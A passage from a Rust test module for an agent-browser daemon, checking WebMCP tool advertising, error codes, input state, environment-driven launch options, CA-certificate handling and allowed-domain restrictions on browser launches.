        }
    }

    #[test]
    fn test_empty_catalog_replaces_stale_tools_even_after_action_error() {
        let mut resp = error_response("cmd", "click failed");
        let mut runtime = webmcp::RuntimeState::default();
        runtime.context_update("session", &[webmcp_tool("search", "https://example.com")]);
        attach_webmcp_availability_from_tools(
            &mut resp,
            "click",
            &[],
            None,
            &mut runtime,
            "session",
        );
        let mut subsequent = error_response("cmd", "click failed");
        let original = subsequent.clone();
        attach_webmcp_availability_from_tools(
            &mut subsequent,
            "click",
            &[],
            None,
            &mut runtime,
            "session",
        );
        assert_eq!(subsequent, original);
        assert_eq!(resp["success"], false);
        assert_eq!(resp["error"], "click failed");
        assert_eq!(resp["data"]["webmcp"]["status"], "ready");
        assert_eq!(resp["data"]["webmcp"]["available"], false);
        assert_eq!(resp["data"]["webmcp"]["tools"], json!([]));
    }

    #[test]
    fn test_administrative_responses_do_not_discover_page_tools() {
        for action in [
            "close",
            "auth_list",
            "state_show",
            "read",
            "session_info",
            "webmcp_list",
            "deny",
        ] {
            let mut resp = success_response("cmd", json!({}));
            let expected = resp.clone();
            attach_webmcp_availability_from_tools(
                &mut resp,
                action,
                &[],
                None,
                &mut webmcp::RuntimeState::default(),
                "session",
            );
            assert_eq!(resp, expected, "{action}");
        }
    }

    #[test]
    fn test_proactive_catalog_excludes_disallowed_origins() {
        let mut resp = success_response("cmd", json!({}));
        let tools = vec![
            webmcp_tool("search", "https://allowed.example"),
            webmcp_tool("secret", "https://blocked.example"),
        ];
        attach_webmcp_availability_from_tools(
            &mut resp,
            "snapshot",
            &tools,
            Some(&DomainFilter::new("allowed.example")),
            &mut webmcp::RuntimeState::default(),
            "session",
        );
        assert_eq!(resp["data"]["webmcp"]["toolCount"], 1);
        assert!(!resp.to_string().contains("secret"));
        assert!(!resp.to_string().contains("blocked.example"));
    }

    #[tokio::test]
    async fn test_navigation_does_not_advertise_when_webmcp_is_disabled() {
        let mut state = DaemonState::new();
        state.engine = "chrome".to_string();
        state.webmcp_enabled = false;
        let mut resp = success_response("cmd-webmcp", json!({"url": "https://example.com"}));
        let expected = resp.clone();

        attach_webmcp_availability(&mut resp, "navigate", &mut state).await;

        assert_eq!(resp, expected);
    }

    #[test]
    fn test_error_response_structure() {
        let resp = error_response("cmd-2", "Something went wrong");
        assert_eq!(resp["id"], "cmd-2");
        assert_eq!(resp["success"], false);
        assert_eq!(resp["error"], "Something went wrong");
        // Ordinary errors carry no machine-readable code.
        assert!(resp.get("code").is_none());
    }

    #[test]
    fn test_error_response_tab_gone_code() {
        // Errors whose message starts with the tab-gone prefix get a
        // top-level machine-readable `code` so `--json` consumers can match
        // on it instead of parsing the message.
        let err = format!(
            "{} bound tab is gone (target ABC). Run `agent-browser tab new <url>`",
            super::super::browser::TAB_GONE_PREFIX
        );
        let resp = error_response("cmd-3", &err);
        assert_eq!(resp["success"], false);
        assert_eq!(resp["code"], "tab_gone");
    }

    #[test]
    fn test_webmcp_unsupported_error_is_actionable_and_machine_readable() {
        let error = webmcp::unsupported_error("active backend is lightpanda");
        let resp = error_response("cmd-webmcp", &error);
        assert_eq!(resp["success"], false);
        assert_eq!(resp["code"], webmcp::ERR_UNSUPPORTED);
        assert!(error.contains("current agent-browser-managed Chrome"));
        assert!(error.contains("without --no-webmcp"));
        assert!(error.contains("active backend is lightpanda"));
    }

    #[tokio::test]
    async fn test_daemon_state_new() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_SESSION_NAME",
            "AGENT_BROWSER_SESSION",
        ]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");
        guard.remove("AGENT_BROWSER_SESSION_NAME");
        guard.remove("AGENT_BROWSER_SESSION");

        let state = DaemonState::new();
        assert!(state.browser.is_none());
        assert!(state.domain_filter.read().await.is_none());
        assert_eq!(state.session_id, "default");
        assert!(!state.tracing_state.active);
        assert!(!state.recording_state.active);
        assert_eq!(state.mouse_state.x, 0.0);
        assert_eq!(state.mouse_state.y, 0.0);
        assert_eq!(state.mouse_state.buttons, 0);
    }

    #[test]
    fn test_session_setup_treats_cleared_values_as_empty() {
        let mut setup = SessionSetup {
            extra_headers: Some(HashMap::new()),
            offline: Some(false),
            ..SessionSetup::default()
        };
        assert!(setup.is_empty());

        setup.offline = Some(true);
        assert!(!setup.is_empty());

        setup.offline = None;
        setup
            .extra_headers
            .as_mut()
            .unwrap()
            .insert("X-Test".to_string(), "set".to_string());
        assert!(!setup.is_empty());
    }

    #[test]
    fn test_init_script_handles_are_independent_from_session_identifiers() {
        let mut setup = SessionSetup::default();
        let first = setup.register_init_script(
            "window.first = true".to_string(),
            "session-a".to_string(),
            "1".to_string(),
        );
        let second = setup.register_init_script(
            "window.second = true".to_string(),
            "session-b".to_string(),
            "1".to_string(),
        );

        assert_eq!(first, "init-script-1");
        assert_eq!(second, "init-script-2");
        assert_eq!(setup.init_scripts.len(), 2);
        assert_eq!(setup.init_scripts[0].session_identifiers["session-a"], "1");
        assert_eq!(setup.init_scripts[1].session_identifiers["session-b"], "1");
    }

    #[test]
    fn test_mouse_event_params_preserve_position_and_buttons() {
        let mut mouse_state = MouseState::default();

        let move_params = build_mouse_event_params(
            &mut mouse_state,
            "mouseMoved",
            Some(120.0),
            Some(240.0),
            None,
            None,
            None,
            None,
            None,
            None,
        );
        assert_eq!(move_params.x, 120.0);
        assert_eq!(move_params.y, 240.0);
        assert_eq!(move_params.buttons, Some(0));

        let down_params = build_mouse_event_params(
            &mut mouse_state,
            "mousePressed",
            None,
            None,
            Some("left"),
            None,
            Some(1),
            None,
            None,
            None,
        );
        assert_eq!(down_params.x, 120.0);
        assert_eq!(down_params.y, 240.0);
        assert_eq!(down_params.button.as_deref(), Some("left"));
        assert_eq!(down_params.buttons, Some(1));
        assert_eq!(mouse_state.buttons, 1);

        let drag_move_params = build_mouse_event_params(
            &mut mouse_state,
            "mouseMoved",
            Some(150.0),
            Some(260.0),
            None,
            None,
            None,
            None,
            None,
            None,
        );
        assert_eq!(drag_move_params.buttons, Some(1));
        assert_eq!(drag_move_params.button.as_deref(), Some("left"));
        assert_eq!(mouse_state.x, 150.0);
        assert_eq!(mouse_state.y, 260.0);

        let up_params = build_mouse_event_params(
            &mut mouse_state,
            "mouseReleased",
            None,
            None,
            Some("left"),
            None,
            Some(1),
            None,
            None,
            None,
        );
        assert_eq!(up_params.x, 150.0);
        assert_eq!(up_params.y, 260.0);
        assert_eq!(up_params.buttons, Some(0));
        assert_eq!(mouse_state.buttons, 0);
    }

    #[test]
    fn test_reset_input_state_clears_mouse_state() {
        let mut state = DaemonState::new();
        state.mouse_state.x = 12.0;
        state.mouse_state.y = 34.0;
        state.mouse_state.buttons = 1;

        state.reset_input_state();

        assert_eq!(state.mouse_state.x, 0.0);
        assert_eq!(state.mouse_state.y, 0.0);
        assert_eq!(state.mouse_state.buttons, 0);
    }

    #[test]
    fn test_launch_options_from_env_defaults() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_HEADED",
            "AGENT_BROWSER_HIDE_SCROLLBARS",
            "AGENT_BROWSER_ALLOWED_DOMAINS",
        ]);
        guard.remove("AGENT_BROWSER_HEADED");
        guard.remove("AGENT_BROWSER_HIDE_SCROLLBARS");
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");
        let opts = Running::from_env().launch_options();
        assert!(opts.headless);
        assert!(opts.args.is_empty());
        assert!(!opts.allow_file_access);
        assert!(opts.hide_scrollbars);
        assert!(!opts.restrict_webrtc);
    }

    #[test]
    fn test_launch_options_from_env_headed_flag() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_HEADED", "AGENT_BROWSER_HIDE_SCROLLBARS"]);
        guard.set("AGENT_BROWSER_HEADED", "1");
        guard.remove("AGENT_BROWSER_HIDE_SCROLLBARS");
        let opts = Running::from_env().launch_options();
        assert!(
            !opts.headless,
            "AGENT_BROWSER_HEADED=1 should set headless=false"
        );
    }

    #[test]
    fn test_launch_options_from_env_args_keep_commas_inside_values() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ARGS"]);
        guard.set(
            "AGENT_BROWSER_ARGS",
            "--disable-features=HttpsUpgrades,Translate,--no-first-run\n--window-size=1280,720",
        );
        let opts = Running::from_env().launch_options();
        assert_eq!(
            opts.args,
            vec![
                "--disable-features=HttpsUpgrades,Translate",
                "--no-first-run",
                "--window-size=1280,720",
            ]
        );
    }

    #[test]
    fn test_launch_options_from_env_hide_scrollbars_false() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_HIDE_SCROLLBARS"]);
        guard.set("AGENT_BROWSER_HIDE_SCROLLBARS", "false");
        let opts = Running::from_env().launch_options();
        assert!(!opts.hide_scrollbars);
    }

    #[test]
    fn test_launch_options_from_env_webgpu() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_WEBGPU"]);
        guard.remove("AGENT_BROWSER_WEBGPU");
        assert!(!Running::from_env().launch_options().webgpu);
        guard.set("AGENT_BROWSER_WEBGPU", "1");
        assert!(Running::from_env().launch_options().webgpu);
    }

    #[test]
    fn test_daemon_state_new_seeds_fields_from_settings() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_SESSION_NAME",
            "AGENT_BROWSER_RESTORE_SAVE",
            "AGENT_BROWSER_DEFAULT_TIMEOUT",
            "AGENT_BROWSER_ENGINE",
            "AGENT_BROWSER_NO_AUTO_DIALOG",
            "AGENT_BROWSER_CONFIRM_ACTIONS",
            "AGENT_BROWSER_ACTION_POLICY",
            "AGENT_BROWSER_POLICY",
            "AGENT_BROWSER_PIN_TAB",
        ]);
        guard.remove("AGENT_BROWSER_POLICY");
        guard.remove("AGENT_BROWSER_PIN_TAB");
        let policy_dir = tempfile::tempdir().unwrap();
        let policy_path = policy_dir.path().join("policy.json");
        fs::write(
            &policy_path,
            r#"{"default": "allow", "deny": ["evaluate"]}"#,
        )
        .unwrap();
        guard.set("AGENT_BROWSER_ACTION_POLICY", policy_path.to_str().unwrap());
        guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", "a.test, *.b.test");
        guard.set("AGENT_BROWSER_SESSION_NAME", "work");
        guard.set("AGENT_BROWSER_RESTORE_SAVE", "never");
        guard.set("AGENT_BROWSER_DEFAULT_TIMEOUT", "7000");
        guard.set("AGENT_BROWSER_ENGINE", "lightpanda");
        guard.set("AGENT_BROWSER_NO_AUTO_DIALOG", "1");
        guard.set("AGENT_BROWSER_CONFIRM_ACTIONS", "click,fill");

        let state = DaemonState::new();
        assert_eq!(state.session_name.as_deref(), Some("work"));
        assert_eq!(state.restore_save, "never");
        assert_eq!(state.default_timeout_ms, 7000);
        assert_eq!(state.engine, "lightpanda");
        assert!(!state.auto_dialog);
        let policy = state.policy.as_ref().expect("action policy");
        assert!(matches!(policy.check("evaluate"), PolicyResult::Deny(_)));
        assert_eq!(policy.check("click"), PolicyResult::Allow);
        let confirm = state.confirm_actions.as_ref().expect("confirm actions");
        assert!(confirm.requires_confirmation("click"));
        assert!(!confirm.requires_confirmation("navigate"));
        let filter = state.domain_filter.try_read().unwrap();
        let filter = filter.as_ref().expect("domain filter");
        assert!(filter.is_allowed("a.test"));
        assert!(filter.is_allowed("x.b.test"));
        assert!(!filter.is_allowed("c.test"));
    }

    #[test]
    fn test_separator_only_allowed_domains_allow_every_host() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", " , ");
        let state = DaemonState::new();
        // No filter at all, so direct-page providers are not refused either.
        assert!(state.domain_filter.try_read().unwrap().is_none());
    }

    #[test]
    fn test_effective_ca_cert_transitions_distinguish_omission_and_clear() {
        let mut state = DaemonState::new();
        state.effective_ca_cert = Some(EffectiveCaCert {
            path: "/tmp/first.pem".to_string(),
            bundle: crate::ca_bundle::test_bundle(b"first"),
        });

        let omitted = resolve_effective_ca_cert(&json!({}), &state)
            .unwrap()
            .expect("omission should retain the effective CA");
        assert_eq!(omitted.path, "/tmp/first.pem");

        let cleared = resolve_effective_ca_cert(&json!({ "clearCaCert": true }), &state).unwrap();
        assert!(cleared.is_none());
    }

    #[test]
    fn test_provider_compatibility_uses_resolved_ca_cert_transition() {
        let mut state = DaemonState::new();
        state.effective_ca_cert = Some(EffectiveCaCert {
            path: "/tmp/first.pem".to_string(),
            bundle: crate::ca_bundle::test_bundle(b"first"),
        });

        let retained = resolve_effective_ca_cert(&json!({}), &state).unwrap();
        let mut retained_options = LaunchOptions::default();
        apply_effective_ca_cert(&mut retained_options, &retained);
        let error =
            validate_ca_cert_launch_mode(&retained_options, Some("chrome"), true).unwrap_err();
        assert!(error.contains("CA trust is active for this session"));
        assert!(error.contains("--no-ca-cert"));

        let cleared = resolve_effective_ca_cert(&json!({ "clearCaCert": true }), &state).unwrap();
        let mut cleared_options = LaunchOptions::default();
        apply_effective_ca_cert(&mut cleared_options, &cleared);
        assert!(validate_ca_cert_launch_mode(&cleared_options, Some("chrome"), true).is_ok());
    }

    #[test]
    fn test_relaunch_keeps_cdp_headers_only_for_their_endpoint() {
        let mut state = DaemonState::new();
        state.cdp_headers = Some((
            "wss://example.com/cdp".to_string(),
            vec![("Authorization".to_string(), "Bearer a".to_string())],
        ));

        let mut same = json!({ "action": "launch", "cdpUrl": "wss://example.com/cdp" });
        attach_saved_cdp_headers(&mut same, &state);
        assert_eq!(same["cdpHeaders"]["Authorization"], "Bearer a");

        let mut other = json!({ "action": "launch", "cdpUrl": "wss://other.example/cdp" });
        attach_saved_cdp_headers(&mut other, &state);
        assert!(other.get("cdpHeaders").is_none());
    }

    #[test]
    fn test_effective_ca_cert_rejects_set_and_clear_together() {
        let state = DaemonState::new();
        let error = resolve_effective_ca_cert(
            &json!({
                "caCert": "/tmp/proxy-ca.pem",
                "clearCaCert": true
            }),
            &state,
        )
        .unwrap_err();

        assert!(error.contains("Cannot use --ca-cert with --no-ca-cert"));
    }

    #[test]
    fn test_daemon_rejects_ca_cert_outside_local_chrome() {
        let ca = LaunchOptions {
            ca_cert: Some("/tmp/proxy-ca.pem".to_string()),
            ..Default::default()
        };
        assert!(validate_ca_cert_launch_mode(&ca, Some("chrome"), true).is_err());
        assert!(validate_ca_cert_launch_mode(&ca, Some("lightpanda"), false).is_err());

        let ignored = LaunchOptions {
            ca_cert: Some("/tmp/proxy-ca.pem".to_string()),
            ignore_https_errors: true,
            ..Default::default()
        };
        assert!(validate_ca_cert_launch_mode(&ignored, Some("chrome"), false).is_err());

        let profile = LaunchOptions {
            ca_cert: Some("/tmp/proxy-ca.pem".to_string()),
            profile: Some("/tmp/profile".to_string()),
            ..Default::default()
        };
        assert!(validate_ca_cert_launch_mode(&profile, Some("chrome"), false).is_err());
    }

    #[test]
    fn test_allowed_domains_from_launch_command_accepts_cli_array_and_legacy_string() {
        assert_eq!(
            allowed_domains_from_launch_command(&json!({
                "allowedDomains": ["Example.COM", " *.example.org "]
            })),
            Some(vec!["example.com".to_string(), "*.example.org".to_string()])
        );
        assert_eq!(
            allowed_domains_from_launch_command(&json!({
                "allowedDomains": "Example.COM, *.example.org"
            })),
            Some(vec!["example.com".to_string(), "*.example.org".to_string()])
        );
    }

    #[test]
    fn test_network_controls_required_only_when_filter_or_proxy_auth_active() {
        let filter = DomainFilter::new("example.com");
        assert!(!network_controls_required(None, false));
        assert!(network_controls_required(Some(&filter), false));
        assert!(network_controls_required(None, true));
    }

    #[test]
    fn test_defer_new_tab_url_until_proxy_auth_controls_are_active() {
        assert!(
            should_defer_url_until_network_controls(None, true, Some("https://example.com"))
                .unwrap()
        );
        assert!(!should_defer_url_until_network_controls(None, true, None).unwrap());
        assert!(
            !should_defer_url_until_network_controls(None, false, Some("https://example.com"))
                .unwrap()
        );
    }

    #[test]
    fn test_defer_new_tab_url_checks_domain_filter() {
        let filter = DomainFilter::new("example.com");
        assert!(should_defer_url_until_network_controls(
            Some(&filter),
            false,
            Some("https://example.com")
        )
        .unwrap());
        let error = should_defer_url_until_network_controls(
            Some(&filter),
            false,
            Some("https://blocked.com"),
        )
        .unwrap_err();
        assert!(error.contains("blocked.com"), "got: {}", error);
    }

    #[test]
    fn test_network_control_session_ids_include_all_attached_pages() {
        let pages = vec![
            super::super::browser::PageInfo {
                tab_id: 1,
                label: None,
                target_id: "target-1".to_string(),
                session_id: "session-1".to_string(),
                url: "about:blank".to_string(),
                title: String::new(),
                target_type: "page".to_string(),
            },
            super::super::browser::PageInfo {
                tab_id: 2,
                label: None,
                target_id: "target-2".to_string(),
                session_id: "session-2".to_string(),
                url: "about:blank".to_string(),
                title: String::new(),
                target_type: "page".to_string(),
            },
            super::super::browser::PageInfo {
                tab_id: 3,
                label: None,
                target_id: "target-3".to_string(),
                session_id: "session-1".to_string(),
                url: "about:blank".to_string(),
                title: String::new(),
                target_type: "page".to_string(),
            },
        ];

        assert_eq!(
            network_control_session_ids_from_pages(&pages, None).unwrap(),
            vec!["session-1".to_string(), "session-2".to_string()]
        );
    }

    #[test]
    fn test_network_control_session_ids_preserve_direct_page_session() {
        let pages = vec![super::super::browser::PageInfo {
            tab_id: 1,
            label: None,
            target_id: "provider-page".to_string(),
            session_id: String::new(),
            url: String::new(),
            title: String::new(),
            target_type: "page".to_string(),
        }];

        assert_eq!(
            network_control_session_ids_from_pages(&pages, None).unwrap(),
            vec![String::new()]
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_providers_without_webrtc_containment() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        for provider in ["ios", "safari"] {
            let mut state = DaemonState::new();
            let error = handle_launch(
                &json!({
                    "action": "launch",
                    "provider": provider,
                    "allowedDomains": ["example.com"]
                }),
                &mut state,
            )
            .await
            .unwrap_err();
            assert!(error.contains("WebRTC containment"), "got: {}", error);
            assert!(error.to_lowercase().contains(provider), "got: {}", error);
            assert!(
                state.domain_filter.read().await.is_none(),
                "rejected provider launch should not commit allowedDomains"
            );
        }
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_preexisting_external_cdp_sessions() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        let cases = [
            json!({
                "action": "launch",
                "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
                "allowedDomains": ["example.com"]
            }),
            json!({
                "action": "launch",
                "cdpPort": 9222,
                "allowedDomains": ["example.com"]
            }),
            json!({
                "action": "launch",
                "autoConnect": true,
                "allowedDomains": ["example.com"]
            }),
        ];

        for cmd in cases {
            let mut state = DaemonState::new();
            let error = handle_launch(&cmd, &mut state).await.unwrap_err();
            assert!(
                error.contains("existing page scripts"),
                "unexpected error: {}",
                error
            );
            assert!(
                state.domain_filter.read().await.is_none(),
                "rejected external launch should not commit allowedDomains"
            );
        }
    }

    #[test]
    fn test_resolve_launch_target_inherits_attach_and_strips_local_fields() {
        let attached = AttachedTarget::CdpPort(9222);
        let own_target = json!({ "action": "launch", "cdpPort": 9333 });
        assert_eq!(resolve_launch_target(&own_target, Some(&attached)), None);

        let cmd = json!({
            "action": "launch",
            "executablePath": "/usr/bin/chromium",
            "args": ["--no-sandbox"],
            "headless": false,
            "allowedDomains": ["example.com"]
        });
        assert_eq!(resolve_launch_target(&cmd, None), None);
        assert_eq!(
            resolve_launch_target(&cmd, Some(&attached)),
            Some(json!({ "action": "launch", "cdpPort": 9222, "allowedDomains": ["example.com"] }))
        );
    }

    #[tokio::test]
    async fn test_inherited_cdp_attach_refuses_allowed_domains() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");
        let mut state = DaemonState::new();
        state.attached_target = Some(AttachedTarget::CdpPort(9222));

        let error = handle_launch(
            &json!({ "action": "launch", "allowedDomains": ["example.com"] }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("not supported with --cdp"), "got: {}", error);
        assert!(state.domain_filter.read().await.is_none());
        assert_eq!(state.attached_target, Some(AttachedTarget::CdpPort(9222)));
    }

    #[tokio::test]
    async fn test_close_clears_attached_target() {
        let mut state = DaemonState::new();
        state.attached_target = Some(AttachedTarget::CdpPort(9222));
        handle_close(&mut state).await.unwrap();
        assert_eq!(state.attached_target, None);
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_chrome_profiles() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        let mut state = DaemonState::new();
        let error = handle_launch(
            &json!({
                "action": "launch",
                "profile": "/tmp/agent-browser-profile",
                "allowedDomains": ["example.com"]
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("--profile"), "got: {}", error);
        assert!(
            error.contains("restore existing pages"),
            "unexpected error: {}",
            error
        );
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected profile launch should not commit allowedDomains"
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_restore_state_replay() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        let mut state = DaemonState::new();
        // `execute_command` applies the restore config before the launch handler.
        state.session_name = Some("saved-session".to_string());
        let error = handle_launch(
            &json!({
                "action": "launch",
                "restoreKey": "saved-session",
                "allowedDomains": ["example.com"]
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("--restore"), "got: {}", error);
        assert!(error.contains("replay origins"), "got: {}", error);
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected restore replay should not commit allowedDomains"
        );
        assert!(
            state.browser.is_none(),
            "restore replay should be rejected before launching Chrome"
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_storage_state_replay() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        let mut state = DaemonState::new();
        let error = handle_launch(
            &json!({
                "action": "launch",
                "storageState": "/tmp/agent-browser-state.json",
                "allowedDomains": ["example.com"]
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("--state/storageState"), "got: {}", error);
        assert!(error.contains("replays saved origins"), "got: {}", error);
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected storageState replay should not commit allowedDomains"
        );
        assert!(
            state.browser.is_none(),
            "storageState replay should be rejected before launching Chrome"
        );
    }

    #[tokio::test]
    async fn test_state_replay_rejects_active_domain_filter() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        let state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }

        let error = ensure_state_replay_supported_by_active_domain_filter(&state, "state load")
            .await
            .unwrap_err();

        assert!(error.contains("state load"), "got: {}", error);
        assert!(error.contains("replays saved origins"), "got: {}", error);
    }

    #[test]
    fn test_allowed_domains_disallowed_chrome_arg_detects_startup_args() {
        let cases = [
            (
                vec!["--user-data-dir=/tmp/profile".to_string()],
                "--user-data-dir",
            ),
            (
                vec!["/profile-directory=Default".to_string()],
                "--profile-directory",
            ),
            (
                vec!["-restore-last-session".to_string()],
                "--restore-last-session",
            ),
            (vec!["--app=https://example.com".to_string()], "--app"),
            (vec!["https://example.com".to_string()], "a startup URL"),
            (vec!["HTTPS://example.com".to_string()], "a startup URL"),
            (vec!["FILE:///tmp/page.html".to_string()], "a startup URL"),
            (vec!["example.com".to_string()], "a startup URL or path"),
            (vec!["/tmp/page.html".to_string()], "a startup URL or path"),
            (
                vec!["C:\\tmp\\page.html".to_string()],
                "a startup URL or path",
            ),
        ];

        for (args, expected) in cases {
            assert_eq!(allowed_domains_disallowed_chrome_arg(&args), Some(expected));
        }

        assert_eq!(
            allowed_domains_disallowed_chrome_arg(&["--window-size=1280,720".to_string()]),
            None
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_profile_chrome_args() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
        guard.remove("AGENT_BROWSER_ALLOWED_DOMAINS");

        let mut state = DaemonState::new();
        let error = handle_launch(
            &json!({
                "action": "launch",
                "args": ["--user-data-dir=/tmp/agent-browser-profile"],
                "allowedDomains": ["example.com"]
            }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("--args"), "got: {}", error);
        assert!(error.contains("--user-data-dir"), "got: {}", error);
        assert!(
            error.contains("restore or open pages"),
            "unexpected error: {}",
            error
        );
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected raw profile args should not commit allowedDomains"
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_env_profile_during_auto_launch() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_PROFILE",
            "AGENT_BROWSER_ARGS",
            "AGENT_BROWSER_CDP",
            "AGENT_BROWSER_AUTO_CONNECT",
            "AGENT_BROWSER_PROVIDER",
        ]);
        guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", "example.com");
        guard.set("AGENT_BROWSER_PROFILE", "/tmp/agent-browser-profile");
        guard.remove("AGENT_BROWSER_ARGS");
        guard.remove("AGENT_BROWSER_CDP");
        guard.remove("AGENT_BROWSER_AUTO_CONNECT");
        guard.remove("AGENT_BROWSER_PROVIDER");

        let mut state = DaemonState::new();
        let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

        assert!(error.contains("--profile"), "got: {}", error);
        assert!(
            error.contains("restore existing pages"),
            "unexpected error: {}",
            error
        );
        assert!(
            state.browser.is_none(),
            "auto_launch should reject before launching Chrome"
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_env_profile_args_during_auto_launch() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_PROFILE",
            "AGENT_BROWSER_ARGS",
            "AGENT_BROWSER_STATE",
            "AGENT_BROWSER_SESSION_NAME",
            "AGENT_BROWSER_CDP",
            "AGENT_BROWSER_AUTO_CONNECT",
            "AGENT_BROWSER_PROVIDER",
        ]);
        guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", "example.com");
        guard.remove("AGENT_BROWSER_PROFILE");
        guard.set(
            "AGENT_BROWSER_ARGS",
            "--user-data-dir=/tmp/agent-browser-profile",
        );
        guard.remove("AGENT_BROWSER_STATE");
        guard.remove("AGENT_BROWSER_SESSION_NAME");
        guard.remove("AGENT_BROWSER_CDP");
        guard.remove("AGENT_BROWSER_AUTO_CONNECT");
        guard.remove("AGENT_BROWSER_PROVIDER");

        let mut state = DaemonState::new();
        let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

        assert!(error.contains("--args"), "got: {}", error);
        assert!(error.contains("--user-data-dir"), "got: {}", error);
        assert!(
            state.browser.is_none(),
            "auto_launch should reject raw profile args before launching Chrome"
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_env_restore_during_auto_launch() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_PROFILE",
            "AGENT_BROWSER_ARGS",
            "AGENT_BROWSER_STATE",
            "AGENT_BROWSER_SESSION_NAME",
            "AGENT_BROWSER_CDP",
            "AGENT_BROWSER_AUTO_CONNECT",
            "AGENT_BROWSER_PROVIDER",
        ]);
        guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", "example.com");
        guard.set("AGENT_BROWSER_SESSION_NAME", "saved-session");
        guard.remove("AGENT_BROWSER_PROFILE");
        guard.remove("AGENT_BROWSER_ARGS");
        guard.remove("AGENT_BROWSER_STATE");
        guard.remove("AGENT_BROWSER_CDP");
        guard.remove("AGENT_BROWSER_AUTO_CONNECT");
        guard.remove("AGENT_BROWSER_PROVIDER");

        let mut state = DaemonState::new();
        let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

        assert!(error.contains("--restore"), "got: {}", error);
        assert!(
            state.browser.is_none(),
            "auto_launch should reject restore replay before launching Chrome"
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_reject_env_storage_state_during_auto_launch() {
        let guard = EnvGuard::new(&[
            "AGENT_BROWSER_ALLOWED_DOMAINS",
            "AGENT_BROWSER_PROFILE",
            "AGENT_BROWSER_ARGS",
            "AGENT_BROWSER_STATE",
            "AGENT_BROWSER_SESSION_NAME",
            "AGENT_BROWSER_CDP",
            "AGENT_BROWSER_AUTO_CONNECT",
            "AGENT_BROWSER_PROVIDER",
        ]);
        guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", "example.com");
        guard.set("AGENT_BROWSER_STATE", "/tmp/agent-browser-state.json");
        guard.remove("AGENT_BROWSER_PROFILE");
        guard.remove("AGENT_BROWSER_ARGS");
        guard.remove("AGENT_BROWSER_SESSION_NAME");
        guard.remove("AGENT_BROWSER_CDP");
        guard.remove("AGENT_BROWSER_AUTO_CONNECT");
        guard.remove("AGENT_BROWSER_PROVIDER");

        let mut state = DaemonState::new();
        let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

        assert!(error.contains("--state/storageState"), "got: {}", error);
        assert!(
            state.browser.is_none(),
            "auto_launch should reject storage state replay before launching Chrome"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_allowed_domains_reject_plugin_profile_args() {
        use std::os::unix::fs::PermissionsExt;

        let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
